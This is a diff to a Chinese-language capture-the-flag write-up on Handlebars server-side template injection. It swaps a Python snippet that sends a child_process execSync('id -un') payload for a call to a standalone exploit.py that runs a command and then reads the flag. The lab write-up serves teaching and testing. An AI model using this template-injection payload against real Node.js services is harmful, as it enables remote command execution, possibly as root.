@@ -44,24 +44,13 @@ curl -i -X POST http://<TARGET>/ \
 
 ## 3. 利用 SSTI 执行命令
 
-本题使用 Handlebars 的构造函数访问链，最终调用 Node.js 的 `child_process`。复现时可以复用仓库中的真实利用载荷构造函数：
+本题使用 Handlebars 的构造函数访问链，最终调用 Node.js 的 `child_process`。仓库提供独立 HTTP 利用脚本，攻击端只通过目标 Web 端口发送请求：
 
-```python
-from verify_ssti import post, handlebars_rce
-
-target = "http://<TARGET>/"
-
-status, body = post(
-    target,
-    handlebars_rce(
-        "process.mainModule.require('child_process').execSync('id -un')"
-    ),
-)
-print(status)
-print(body)
+```bash
+python3 exploit.py --url http://<TARGET>
 ```
 
-预期响应中能看到命令执行结果。当前容器中的 Express 服务按原题复现方式以 root 身份运行，因此命令执行上下文为 root。
+脚本先执行 `id -un`，确认命令执行上下文，再读取目标 Flag。它不依赖 CI 的预期答案变量，也不会访问目标容器的 Docker 管理接口。
 
 ## 4. 读取 Flag
 
